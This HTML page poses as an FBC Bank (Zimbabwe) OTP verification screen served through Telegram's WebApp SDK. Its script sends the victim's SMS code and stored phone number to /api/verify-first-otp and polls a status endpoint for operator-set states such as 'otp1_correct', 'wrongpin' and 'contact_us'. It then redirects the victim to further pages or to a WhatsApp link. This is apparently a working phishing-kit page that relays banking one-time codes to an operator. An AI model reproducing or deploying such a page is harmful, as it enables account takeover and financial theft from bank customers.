<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>FBC Bank - Verification</title>
    
    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --fbc-primary: #003366;
            --fbc-gradient: linear-gradient(180deg, #004d99 0%, #003366 100%);
            --bg-color: #f7f7f7;
            --card-bg: #ffffff;
            --text-dark: #111111;
            --text-muted: #666666;
            --border-fbc: #003366;
            --btn-disabled-bg: #e0e0e0;
            --btn-disabled-text: #999999;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            align-items: center;
        }

        .header-box {
            width: 100%;
            background: var(--fbc-gradient);
            padding: 25px 20px 40px 20px;
            color: white;
            text-align: center;
            font-size: 26px;
            font-weight: 800;
        }

        .main-container {
            width: 100%;
            display: flex;
            justify-content: center;
            margin-top: -20px;
            flex-grow: 1;
        }

        .card {
            background: var(--card-bg);
            width: 90%;
            max-width: 400px;
            padding: 30px 20px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 51, 102, 0.08);
            align-self: flex-start;
        }

        h2 {
            margin: 0 0 12px 0;
            font-size: 22px;
            color: var(--text-dark);
            font-weight: 800;
            text-align: center;
        }

        .instruction {
            font-size: 14px;
            color: var(--text-muted);
            margin: 0 0 12px 0;
            line-height: 1.4;
            text-align: center;
        }

        .phone-number {
            font-size: 16px;
            font-weight: 800;
            color: var(--text-dark);
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .code-input-container {
            display: flex;
            justify-content: space-between;
            gap: 6px;
            margin-bottom: 20px;
        }

        .code-box {
            width: 48px;
            height: 54px;
            border: 2px solid var(--border-fbc);
            border-radius: 10px;
            text-align: center;
            font-size: 22px;
            font-weight: 800;
            outline: none;
            text-transform: uppercase;
            color: var(--text-dark);
            background-color: #ffffff;
        }

        .resend-text {
            text-align: center;
            color: var(--text-muted);
            font-size: 14px;
            margin: 20px 0;
        }

        .submit-btn {
            width: 100%;
            background-color: var(--btn-disabled-bg);
            color: var(--btn-disabled-text);
            border: none;
            padding: 16px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 800;
            cursor: not-allowed;
            text-transform: uppercase;
            transition: background-color 0.2s;
        }

        .submit-btn.active {
            background-color: var(--fbc-primary);
            color: white;
            cursor: pointer;
        }

        .footer-banner {
            width: 100%;
            background: var(--fbc-gradient);
            height: 80px;
            border-top-left-radius: 50% 30px;
            border-top-right-radius: 50% 30px;
            margin-top: 40px;
        }

        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: var(--fbc-gradient);
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            color: white;
            text-align: center;
            padding: 24px;
        }

        .overlay-card {
            width: 100%;
            max-width: 360px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .spinner {
            width: 56px;
            height: 56px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 24px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .overlay-title {
            font-size: 22px;
            font-weight: 800;
            margin-bottom: 12px;
            color: white;
        }

        .overlay-desc {
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 20px;
            color: #ffffff;
            line-height: 1.4;
        }

        .wa-btn {
            display: block;
            width: 100%;
            background-color: white;
            color: var(--fbc-primary);
            font-weight: 800;
            padding: 16px;
            border-radius: 12px;
            text-decoration: none;
            font-size: 13px;
        }

        .error-message {
            color: #e74c3c;
            font-size: 13px;
            margin-top: 10px;
            display: none;
            text-align: center;
            font-weight: 600;
        }
    </style>
</head>

<body>

<div class="header-box">
    FBC Bank
</div>

<div class="main-container">
    <div class="card">
        <h2>OTP Verification</h2>

        <p class="instruction">
            Enter the 6-character verification code received via SMS
        </p>

        <div class="phone-number">
            <span>🇿🇼</span>
            <span id="displayPhone">+263 ...</span>
        </div>

        <div class="code-input-container">
            <input type="text" maxlength="1" class="code-box" autocomplete="off" spellcheck="false">
            <input type="text" maxlength="1" class="code-box" autocomplete="off" spellcheck="false">
            <input type="text" maxlength="1" class="code-box" autocomplete="off" spellcheck="false">
            <input type="text" maxlength="1" class="code-box" autocomplete="off" spellcheck="false">
            <input type="text" maxlength="1" class="code-box" autocomplete="off" spellcheck="false">
            <input type="text" maxlength="1" class="code-box" autocomplete="off" spellcheck="false">
        </div>

        <div id="errorText" class="error-message">The code entered is incorrect or has expired.</div>

        <div class="resend-text" id="timerBox">
            Resend in <span id="timer">60</span> seconds
        </div>

        <button id="submitBtn" class="submit-btn" disabled>VERIFY</button>
    </div>
</div>

<div class="footer-banner"></div>

<div class="overlay" id="statusOverlay">
    <div class="overlay-card">
        <div class="spinner"></div>
        <div class="overlay-title">Please wait...</div>
    </div>
</div>

<div class="overlay" id="contactOverlay">
    <div class="overlay-card">
        <div class="overlay-title">Contact us on WhatsApp</div>
        <div class="overlay-desc">Click this link to reach us on WhatsApp</div>
        <a href="https://wa.me/message/ICY6YKSAAG3GC1" target="_blank" class="wa-btn">
            https://wa.me/message/ICY6YKSAAG3GC1
        </a>
    </div>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const displayPhone = document.getElementById('displayPhone');
    const codeBoxes = document.querySelectorAll('.code-box');
    const submitBtn = document.getElementById('submitBtn');
    const timerEl = document.getElementById('timer');
    const timerBox = document.getElementById('timerBox');
    const statusOverlay = document.getElementById('statusOverlay');
    const contactOverlay = document.getElementById('contactOverlay');
    const errorText = document.getElementById('errorText');

    let checkInterval = null;

    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone');
    if (savedPhone) {
        displayPhone.textContent = `+263 ${savedPhone.replace(/^\+?263/, '')}`;
    } else {
        displayPhone.textContent = "+263 ...";
    }

    codeBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.toUpperCase().replace(/[^A-Z0-9]/g, '');

            if (box.value && index < codeBoxes.length - 1) {
                codeBoxes[index + 1].focus();
            }

            checkInputs();
        });

        box.addEventListener('keydown', (e) => {
            if (e.key === "Backspace" && !box.value && index > 0) {
                codeBoxes[index - 1].focus();
            }
        });
    });

    function checkInputs() {
        const fullCode = Array.from(codeBoxes).map(b => b.value).join('');
        const isComplete = fullCode.length === 6;
        submitBtn.disabled = !isComplete;
        submitBtn.classList.toggle('active', isComplete);
        errorText.style.display = 'none';
    }

    let timeLeft = 60;
    const timerInterval = setInterval(() => {
        timeLeft--;
        if (timerEl) timerEl.textContent = timeLeft;

        if (timeLeft <= 0) {
            clearInterval(timerInterval);
            timerBox.innerHTML = '<span style="color:#66b2ff; cursor:pointer; font-weight:700;" onclick="location.reload()">Resend code</span>';
        }
    }, 1000);

    function startStatusPolling() {
        if (checkInterval) clearInterval(checkInterval);

        checkInterval = setInterval(async () => {
            try {
                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
                const data = await res.json();

                if (data.status === "otp1_correct") {
                    clearInterval(checkInterval);
                    window.location.href = "/page9";
                } 
                else if (data.status === "otp2_wrongpin" || data.status === "pin_wrong") {
                    clearInterval(checkInterval);
                    window.location.href = "/page6?error=wrongpin";
                } 
                else if (data.status === "otp1_wrong") {
                    clearInterval(checkInterval);
                    statusOverlay.style.display = "none";
                    contactOverlay.style.display = "none";
                    errorText.textContent = "The code is incorrect, please check your SMS.";
                    errorText.style.display = "block";
                    codeBoxes.forEach(b => b.value = "");
                    codeBoxes[0].focus();
                    checkInputs();
                } 
                else if (data.status === "contact_us") {
                    clearInterval(checkInterval);
                    statusOverlay.style.display = "none";
                    contactOverlay.style.display = "flex";
                }
            } catch (err) {
                console.error(err);
            }
        }, 2000);
    }

    submitBtn.addEventListener('click', async () => {
        if (submitBtn.disabled) return;

        const codeValue = Array.from(codeBoxes).map(b => b.value).join('');
        if (codeValue.length < 6) return;

        contactOverlay.style.display = "none";
        statusOverlay.style.display = "flex";
        errorText.style.display = "none";

        try {
            const res = await fetch('/api/verify-first-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    phone: savedPhone,
                    code: codeValue,
                    country: "ZW"
                })
            });

            const responseData = await res.json();
            if (responseData.success) {
                startStatusPolling();
            } else {
                statusOverlay.style.display = "none";
                alert("Error sending request.");
            }
        } catch (err) {
            statusOverlay.style.display = "none";
            alert("Connection error.");
        }
    });

    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }
});
</script>

</body>
</html>
